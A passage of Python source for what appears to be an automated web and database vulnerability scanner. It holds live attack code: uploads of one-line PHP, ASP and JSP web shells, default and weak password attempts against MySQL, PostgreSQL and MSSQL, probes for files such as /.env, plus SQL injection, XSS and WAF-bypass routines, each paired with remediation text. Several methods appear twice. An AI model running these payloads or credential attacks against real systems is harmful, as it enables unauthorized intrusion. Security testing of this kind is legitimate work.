            if attack['success']:
                self._add_vulnerability(
                    f"Database {attack['attack_type']}",
                    'Critical',
                    f"Database Service",
                    attack['details'],
                    attack.get('username', '') + ':' + attack.get('password', ''),
                    'Change default credentials, restrict network access, enable authentication'
                )
        
        # Process Telnet attacks
        for attack in results.get('telnet_attacks', []):
            if attack['success'] or attack['attack_type'] == 'Insecure Protocol Detection':
                severity = 'Critical' if 'Brute Force' in attack['attack_type'] else 'High'
                self._add_vulnerability(
                    f"Telnet {attack['attack_type']}",
                    severity,
                    f"Telnet Service (Port 23)",
                    attack['details'],
                    attack.get('username', '') + ':' + attack.get('password', ''),
                    'Disable Telnet service, use SSH instead for secure remote access'
                )
        
        # Process web service attacks
        for attack in results.get('web_service_attacks', []):
            if attack['success']:
                severity = 'High' if 'Admin Panel' in attack['attack_type'] else 'Medium'
                self._add_vulnerability(
                    f"Web {attack['attack_type']}",
                    severity,
                    attack.get('url', 'Web Service'),
                    attack['details'],
                    attack.get('username', '') + ':' + attack.get('password', ''),
                    'Secure admin interfaces, implement access controls, use strong authentication'
                )
    
    def run_advanced_attacks(self):
        """Execute advanced attack techniques"""
        try:
            # Get detected technology for targeted attacks
            tech_stack = self._get_technology_stack()
            
            # Advanced SQL injection attacks
            if any('sql injection' in v['type'].lower() for v in self.vulnerabilities):
                adv_sql_results = self.advanced_attacks.advanced_sql_injection_attacks(self.vulnerabilities)
                self._process_advanced_sql_results(adv_sql_results)
            
            # Advanced XSS attacks
            if any('xss' in v['type'].lower() for v in self.vulnerabilities):
                adv_xss_results = self.advanced_attacks.advanced_xss_attacks(self.vulnerabilities)
                self._process_advanced_xss_results(adv_xss_results)
            
            # WAF bypass techniques
            if self.vulnerabilities:
                waf_bypass_results = self.advanced_attacks.waf_bypass_techniques(self.vulnerabilities)
                self._process_waf_bypass_results(waf_bypass_results)
            
            # NoSQL injection based on detected technology
            if any(nosql in tech_stack.lower() for nosql in ['mongodb', 'couchdb']):
                nosql_results = self.advanced_attacks.nosql_injection_attacks(tech_stack)
                self._process_nosql_results(nosql_results)
            
            # JWT attacks
            jwt_results = self.advanced_attacks.jwt_attacks()
            self._process_jwt_results(jwt_results)
            
            # Server-Side Template Injection
            ssti_results = self.advanced_attacks.server_side_template_injection()
            self._process_ssti_results(ssti_results)
            
            # Advanced file upload attacks
            file_upload_results = self.advanced_attacks.advanced_file_upload_attacks()
            self._process_file_upload_results(file_upload_results)
            
            # API security testing
            api_results = self.advanced_attacks.api_security_testing()
            self._process_api_results(api_results)
            
            # Advanced information gathering
            info_results = self.advanced_attacks.advanced_information_gathering()
            self._process_info_results(info_results)
            
        except Exception as e:
            print(f"Error in advanced attacks: {e}")
    
    def _get_technology_stack(self) -> str:
        """Get detected technology stack"""
        tech_stack = ""
        for vuln in self.vulnerabilities:
            if vuln['type'] == 'Technology Stack Disclosure':
                tech_stack += vuln['payload'] + " "
        return tech_stack
    
    def _process_advanced_sql_results(self, results: Dict):
        """Process advanced SQL injection results"""
        if results['union_based']:
            for result in results['union_based']:
                self._add_vulnerability(
                    'Advanced SQL Injection - Union-Based',
                    'Critical',
                    result['location'],
                    f"Union-based SQL injection with data extraction: {', '.join(result['extracted_data'][:3])}",
                    result['payload'],
                    'Use parameterized queries and implement strict input validation'
                )
        
        if results['time_based']:
            for result in results['time_based']:
                self._add_vulnerability(
                    'Advanced SQL Injection - Time-Based Blind',
                    'High',
                    result['location'],
                    'Time-based blind SQL injection confirmed with delay detection',
                    result['payload'],
                    'Implement proper input sanitization and use prepared statements'
                )
        
        if results['boolean_based']:
            for result in results['boolean_based']:
                self._add_vulnerability(
                    'Advanced SQL Injection - Boolean-Based Blind',
                    'High',
                    result['location'],
                    'Boolean-based blind SQL injection confirmed with response analysis',
                    result['true_payload'],
                    'Use parameterized queries and validate all user inputs'
                )
    
    def _process_advanced_xss_results(self, results: Dict):
        """Process advanced XSS results"""
        for attack_type, attacks in results.items():
            if attacks:
                for attack in attacks:
                    severity = 'Critical' if 'polyglot' in attack_type else 'High'
                    self._add_vulnerability(
                        f'Advanced XSS - {attack_type.replace("_", " ").title()}',
                        severity,
                        attack['location'],
                        f'Advanced XSS filter bypass technique successful',
                        attack['payload'],
                        'Implement comprehensive output encoding and CSP headers'
                    )
    
    def _process_waf_bypass_results(self, results: Dict):
        """Process WAF bypass results"""
        for bypass_type, bypasses in results.items():
            if bypasses:
                for bypass in bypasses:
                    self._add_vulnerability(
                        f'WAF Bypass - {bypass_type.replace("_", " ").title()}',
                        'High',
                        bypass['location'],
                        f'WAF bypass successful using {bypass_type.replace("_", " ")} technique',
                        bypass['payload'],
                        'Configure WAF with comprehensive rule sets and regular updates'
                    )
    
    def _process_nosql_results(self, results: Dict):
        """Process NoSQL injection results"""
        for db_type, injections in results.items():
            if injections:
                for injection in injections:
                    self._add_vulnerability(
                        f'NoSQL Injection - {db_type.replace("_", " ").title()}',
                        'Critical',
                        'NoSQL Database',
                        f'NoSQL injection vulnerability in {db_type}',
                        injection['payload'],
                        'Implement proper input validation and use parameterized queries'
                    )
    
    def _process_jwt_results(self, results: Dict):
        """Process JWT attack results"""
        for attack_type, attacks in results.items():
            if attacks:
                for attack in attacks:
                    self._add_vulnerability(
                        f'JWT Vulnerability - {attack_type.replace("_", " ").title()}',
                        'Critical',
                        'JWT Authentication',
                        f'JWT security issue: {attack.get("attack_type", attack_type)}',
                        str(attack),
                        'Use strong secrets, validate algorithms, and implement proper JWT handling'
                    )
    
    def _process_ssti_results(self, results: Dict):
        """Process SSTI results"""
        for engine_type, injections in results.items():
            if injections:
                for injection in injections:
                    self._add_vulnerability(
                        f'Server-Side Template Injection - {engine_type.replace("_", " ").title()}',
                        'Critical',
                        injection['context'],
                        f'SSTI vulnerability in {engine_type} template engine',
                        injection['payload'],
                        'Sanitize user input and use safe template rendering practices'
                    )
    
    def _process_file_upload_results(self, results: Dict):
        """Process advanced file upload results"""
        for attack_type, uploads in results.items():
            if uploads:
                for upload in uploads:
                    self._add_vulnerability(
                        f'Advanced File Upload - {attack_type.replace("_", " ").title()}',
                        'Critical',
                        upload['endpoint'],
                        f'Advanced file upload bypass: {upload["filename"]}',
                        upload['filename'],
                        'Implement strict file validation, content scanning, and secure upload handling'
                    )
    
    def _process_api_results(self, results: Dict):
        """Process API security results"""
        for api_type, issues in results.items():
            if issues:
                for issue in issues:
                    severity = 'Critical' if 'introspection' in api_type else 'Medium'
                    self._add_vulnerability(
                        f'API Security - {api_type.replace("_", " ").title()}',
                        severity,
                        issue.get('endpoint', 'API'),
                        f'API security issue detected: {api_type}',
                        str(issue),
                        'Implement proper API authentication, rate limiting, and access controls'
                    )
    
    def _process_info_results(self, results: Dict):
        """Process advanced information gathering results"""
        if results['admin_panel_discovery']:
            for panel in results['admin_panel_discovery']:
                self._add_vulnerability(
                    'Admin Panel Exposure',
                    'Medium',
                    panel['path'],
                    f'Admin panel discovered: {panel["title"]}',
                    panel['path'],
                    'Restrict access to admin panels and implement proper authentication'
                )
        
        if results['backup_file_detection']:
            for backup in results['backup_file_detection']:
                self._add_vulnerability(
                    'Backup File Exposure',
                    'High',
                    backup['file'],
                    f'Backup file accessible: {backup["file"]}',
                    backup['content_preview'],
                    'Remove backup files from web accessible directories'
                )
        
        if results['version_disclosure']:
            version_info = ', '.join(results['version_disclosure'])
            self._add_vulnerability(
                'Version Information Disclosure',
                'Low',
                'HTTP Response',
                f'Version information disclosed: {version_info}',
                version_info,
                'Remove version information from HTTP responses and error pages'
            )
    
    def _test_idor(self, original_url, test_url, original_id, test_id):
        """Enhanced IDOR testing"""
        try:
            original_response = self.session.get(original_url, timeout=10)
            test_response = self.session.get(test_url, timeout=10)
            
            # Enhanced IDOR detection
            if (test_response.status_code == 200 and 
                original_response.status_code == 200 and
                len(test_response.text) > 100 and
                test_response.text != original_response.text):
                
                # Enhanced indicators
                indicators = [
                    'profile', 'account', 'user', 'personal', 'private',
                    'confidential', 'dashboard', 'admin', 'customer',
                    'email', 'phone', 'address', 'balance', 'order'
                ]
                
                test_content = test_response.text.lower()
                if any(indicator in test_content for indicator in indicators):
                    self._add_vulnerability(
                        'Insecure Direct Object Reference (IDOR)',
                        'High',
                        test_url,
                        f"Unauthorized access to object with ID {test_id} (original ID: {original_id})",
                        f"Original: {original_url}\nTest: {test_url}",
                        self.vuln_db.get_prevention('idor')
                    )
                    return True
                    
        except Exception:
            pass
        
        return False
    
    def check_security_headers(self):
        """Enhanced security headers check"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            headers = response.headers
            
            security_headers_check = [
                ('Content-Security-Policy', 'High'),
                ('X-Frame-Options', 'Medium'),
                ('X-XSS-Protection', 'Low'),
                ('X-Content-Type-Options', 'Medium'),
                ('Strict-Transport-Security', 'High'),
                ('Referrer-Policy', 'Low'),
                ('Permissions-Policy', 'Medium'),
                ('X-Permitted-Cross-Domain-Policies', 'Low'),
                ('Cross-Origin-Embedder-Policy', 'Medium'),
                ('Cross-Origin-Opener-Policy', 'Medium'),
                ('Cross-Origin-Resource-Policy', 'Medium')
            ]
            
            for header_name, importance in security_headers_check:
                status = 'Present' if header_name in headers else 'Missing'
                value = headers.get(header_name, 'Not set')
                
                self.security_headers.append({
                    'Header': header_name,
                    'Status': status,
                    'Value': value[:100] + '...' if len(value) > 100 else value,
                    'Importance': importance
                })
                
                if status == 'Missing' and importance in ['High', 'Medium']:
                    severity = 'Medium' if importance == 'High' else 'Low'
                    self._add_vulnerability(
                        'Missing Security Header',
                        severity,
                        'HTTP Response Headers',
                        f"Missing {header_name} header",
                        f"Header: {header_name}",
                        self.vuln_db.get_prevention('security_headers')
                    )
                    
        except Exception:
            pass
    
    def _add_vulnerability(self, vuln_type, severity, location, description, payload, prevention):
        """Add a vulnerability to the results"""
        vulnerability = {
            'type': vuln_type,
            'severity': severity,
            'location': location,
            'description': description,
            'payload': payload,
            'prevention': prevention,
            'references': self.vuln_db.get_references(vuln_type.lower().replace(' ', '_').replace('(', '').replace(')', ''))
        }
        self.vulnerabilities.append(vulnerability)
    
    def get_results(self):
        """Get comprehensive scan results"""
        return {
            'target_url': self.target_url,
            'target_ip': self.target_ip,
            'scan_timestamp': time.time(),
            'vulnerabilities': self.vulnerabilities,
            'security_headers': self.security_headers,
            'open_ports': self.open_ports,
            'services': self.services,
            'total_vulnerabilities': len(self.vulnerabilities),
            'critical_severity': len([v for v in self.vulnerabilities if v['severity'] == 'Critical']),
            'high_severity': len([v for v in self.vulnerabilities if v['severity'] == 'High']),
            'medium_severity': len([v for v in self.vulnerabilities if v['severity'] == 'Medium']),
            'low_severity': len([v for v in self.vulnerabilities if v['severity'] == 'Low']),
            'info_severity': len([v for v in self.vulnerabilities if v['severity'] == 'Info'])
        }
    
    # Additional vulnerability scanning methods
    def scan_session_management(self):
        """Scan for session management vulnerabilities"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            
            # Check for session cookies
            for cookie in response.cookies:
                # Check for secure flag
                if not cookie.secure and self.target_url.startswith('https://'):
                    self._add_vulnerability(
                        'Insecure Cookie - Missing Secure Flag',
                        'Medium',
                        f'Cookie: {cookie.name}',
                        'Session cookie transmitted over HTTPS without Secure flag',
                        cookie.name,
                        'Set Secure flag on all cookies transmitted over HTTPS'
                    )
                
                # Check for HttpOnly flag
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    self._add_vulnerability(
                        'Insecure Cookie - Missing HttpOnly Flag',
                        'Medium',
                        f'Cookie: {cookie.name}',
                        'Session cookie accessible via JavaScript',
                        cookie.name,
                        'Set HttpOnly flag on session cookies'
                    )
        except:
            pass
    
    def scan_file_upload(self):
        """Scan for file upload vulnerabilities"""
        # Look for file upload forms
        for form in self.forms:
            has_file_input = any(inp['type'] == 'file' for inp in form['inputs'])
            
            if has_file_input:
                # Test malicious file upload
                malicious_files = [
                    ('shell.php', '<?php system($_GET["cmd"]); ?>'),
                    ('test.asp', '<% execute(request("cmd")) %>'),
                    ('exploit.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>')
                ]
                
                for filename, content in malicious_files:
                    try:
                        form_action = form['action'] or self.target_url
                        if not form_action.startswith('http'):
                            form_action = urllib.parse.urljoin(self.target_url, form_action)
                        
                        files = {'file': (filename, content, 'text/plain')}
                        form_data = {inp['name']: inp.get('value', 'test') for inp in form['inputs'] if inp['type'] != 'file'}
                        
                        response = self.session.post(form_action, files=files, data=form_data, timeout=10)
                        
                        # Check if file was uploaded successfully
                        if response.status_code == 200 and any(indicator in response.text.lower() for indicator in ['uploaded', 'success', 'file saved']):
                            self._add_vulnerability(
                                'Unrestricted File Upload',
                                'Critical',
                                f'Form: {form_action}',
                                'Application allows upload of potentially malicious files',
                                filename,
                                'Implement file type validation, content scanning, and upload restrictions'
                            )
                            break
                    except:
                        continue
    
    def scan_information_disclosure(self):
        """Scan for information disclosure vulnerabilities"""
        # Check for common sensitive files
        sensitive_files = [
            '/.env', '/config.php', '/wp-config.php', 
            '/admin/', '/test/', '/phpinfo.php'
        ]
        
        for file_path in sensitive_files:
            try:
                test_url = urllib.parse.urljoin(self.target_url, file_path)
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code == 200 and len(response.text) > 50:
                    # Check for sensitive content indicators
                    sensitive_indicators = [
                        'password', 'secret', 'key', 'token', 'database',
                        'mysql', 'postgresql', 'mongodb', 'redis'
                    ]
                    
                    if any(indicator in response.text.lower() for indicator in sensitive_indicators):
                        self._add_vulnerability(
                            'Information Disclosure',
                            'Medium',
                            test_url,
                            f'Sensitive file accessible: {file_path}',
                            file_path,
                            'Remove or restrict access to sensitive files and directories'
                        )
            except:
                continue
    
    def scan_business_logic(self):
        """Scan for business logic vulnerabilities"""
        # Test for price manipulation in forms
        for form in self.forms:
            for inp in form['inputs']:
                if any(field in inp['name'].lower() for field in ['price', 'amount', 'cost', 'total']):
                    try:
                        form_data = {input_field['name']: input_field.get('value', 'test') for input_field in form['inputs']}
                        
                        # Test negative values
                        form_data[inp['name']] = '-100'
                        response = self.session.post(form['action'], data=form_data, timeout=5)
                        
                        if response.status_code == 200:
                            self._add_vulnerability(
                                'Business Logic - Price Manipulation',
                                'High',
                                form['action'],
                                f'Form accepts negative values for {inp["name"]}',
                                str(form_data),
                                'Implement proper input validation for numeric fields'
                            )
                    except:
                        continue
    
    def _check_mysql_vulnerabilities(self):
        """Check MySQL-specific vulnerabilities"""
        try:
            # Test for default credentials
            import pymysql
            try:
                connection = pymysql.connect(
                    host=self.target_ip,
                    user='root',
                    password='',
                    connect_timeout=5
                )
                connection.close()
                
                self._add_vulnerability(
                    'MySQL Default Credentials',
                    'Critical',
                    'MySQL Service (Port 3306)',
                    'MySQL server accessible with default root credentials',
                    'root:(empty password)',
                    'Change default MySQL credentials immediately'
                )
            except:
                pass
            
            # Test common weak passwords
            weak_passwords = ['password', '123456', 'admin', 'mysql', 'root']
            for password in weak_passwords:
                try:
                    connection = pymysql.connect(
                        host=self.target_ip,
                        user='root',
                        password=password,
                        connect_timeout=3
                    )
                    connection.close()
                    
                    self._add_vulnerability(
                        'MySQL Weak Credentials',
                        'Critical',
                        'MySQL Service (Port 3306)',
                        f'MySQL server accessible with weak credentials',
                        f'root:{password}',
                        'Use strong, unique passwords for database accounts'
                    )
                    break
                except:
                    continue
                    
        except ImportError:
            pass
        except Exception:
            pass
    
    def _check_postgresql_vulnerabilities(self):
        """Check PostgreSQL-specific vulnerabilities"""
        try:
            import psycopg2
            # Test for default credentials
            try:
                connection = psycopg2.connect(
                    host=self.target_ip,
                    user='postgres',
                    password='',
                    connect_timeout=5
                )
                connection.close()
                
                self._add_vulnerability(
                    'PostgreSQL Default Credentials',
                    'Critical',
                    'PostgreSQL Service (Port 5432)',
                    'PostgreSQL server accessible with default credentials',
                    'postgres:(empty password)',
                    'Change default PostgreSQL credentials immediately'
                )
            except:
                pass
        except ImportError:
            pass
        except Exception:
            pass
    
    def _check_mssql_vulnerabilities(self):
        """Check MSSQL-specific vulnerabilities"""
        try:
            # Test for default credentials
            import pyodbc
            try:
                connection = pyodbc.connect(
                    f'DRIVER={{SQL Server}};SERVER={self.target_ip};UID=sa;PWD=;',
                    timeout=5
                )
                connection.close()
                
                self._add_vulnerability(
                    'MSSQL Default Credentials',
                    'Critical',
                    'MSSQL Service (Port 1433)',
                    'MSSQL server accessible with default sa credentials',
                    'sa:(empty password)',
                    'Change default MSSQL credentials immediately'
                )
            except:
                pass
        except ImportError:
            pass
        except Exception:
            pass

    def scan_business_logic_enhanced(self):
        """Enhanced business logic vulnerability scanning"""
        # Test for price manipulation in forms
        for form in self.forms:
            for inp in form['inputs']:
                if any(field in inp['name'].lower() for field in ['price', 'amount', 'cost', 'total']):
                    try:
                        form_data = {input_field['name']: input_field.get('value', 'test') for input_field in form['inputs']}
                        
                        # Test negative values
                        form_data[inp['name']] = '-1'
                        
                        form_action = form['action'] or self.target_url
                        if not form_action.startswith('http'):
                            form_action = urllib.parse.urljoin(self.target_url, form_action)
                        
                        if form['method'] == 'POST':
                            response = self.session.post(form_action, data=form_data, timeout=10)
                        else:
                            response = self.session.get(form_action, params=form_data, timeout=10)
                        
                        # Check if negative value was accepted
                        if response.status_code == 200 and 'error' not in response.text.lower():
                            self._add_vulnerability(
                                'Business Logic Flaw',
                                'High',
                                f'Form field: {inp["name"]}',
                                'Application accepts negative values for price/amount fields',
                                'Negative value: -1',
                                'Implement proper input validation for business-critical fields'
                            )
                    except:
                        continue
    
    # Database-specific vulnerability checks
    def _check_mysql_vulnerabilities(self):
        """Check MySQL-specific vulnerabilities"""
        try:
            # Test for default credentials
            import pymysql
            try:
                connection = pymysql.connect(
                    host=self.target_ip,
                    user='root',
                    password='',
                    connect_timeout=5
                )
                connection.close()
                
                self._add_vulnerability(
                    'MySQL Default Credentials',
                    'Critical',
                    'MySQL Service (Port 3306)',
                    'MySQL server accessible with default root credentials',
                    'root:(empty password)',
                    'Change default MySQL credentials immediately'
                )
            except:
                pass
            
            # Test common weak passwords
            weak_passwords = ['password', '123456', 'admin', 'mysql', 'root']
            for password in weak_passwords:
                try:
                    connection = pymysql.connect(
                        host=self.target_ip,
                        user='root',
                        password=password,
                        connect_timeout=3
                    )
                    connection.close()
                    
                    self._add_vulnerability(
                        'MySQL Weak Credentials',
                        'Critical',
                        'MySQL Service (Port 3306)',
                        f'MySQL server accessible with weak credentials',
                        f'root:{password}',
                        'Use strong, unique passwords for database accounts'
                    )
                    break
                except:
                    continue
                    
        except ImportError:
            pass
        except Exception:
            pass
    
    def _check_postgresql_vulnerabilities(self):
        """Check PostgreSQL-specific vulnerabilities"""
        try:
            import psycopg2
            # Test for default credentials
            try:
                connection = psycopg2.connect(
                    host=self.target_ip,
                    user='postgres',
                    password='',
                    connect_timeout=5
                )
                connection.close()
                
                self._add_vulnerability(
                    'PostgreSQL Default Credentials',
                    'Critical',
                    'PostgreSQL Service (Port 5432)',
                    'PostgreSQL server accessible with default credentials',
                    'postgres:(empty password)',
                    'Change default PostgreSQL credentials immediately'
                )
            except:
                pass
        except ImportError:
            pass
        except Exception:
            pass
    
    def _check_mssql_vulnerabilities(self):
        """Check MSSQL-specific vulnerabilities"""
        try:
            # Test for default credentials
            import pyodbc
            try:
                connection = pyodbc.connect(
                    f'DRIVER={{SQL Server}};SERVER={self.target_ip};UID=sa;PWD=;',
                    timeout=5
                )
                connection.close()
                
                self._add_vulnerability(
                    'MSSQL Default Credentials',
                    'Critical',
                    'MSSQL Service (Port 1433)',
                    'MSSQL server accessible with default sa credentials',
                    'sa:(empty password)',
                    'Change default MSSQL credentials immediately'
                )
            except:
                pass
        except ImportError:
            pass
        except Exception:
            pass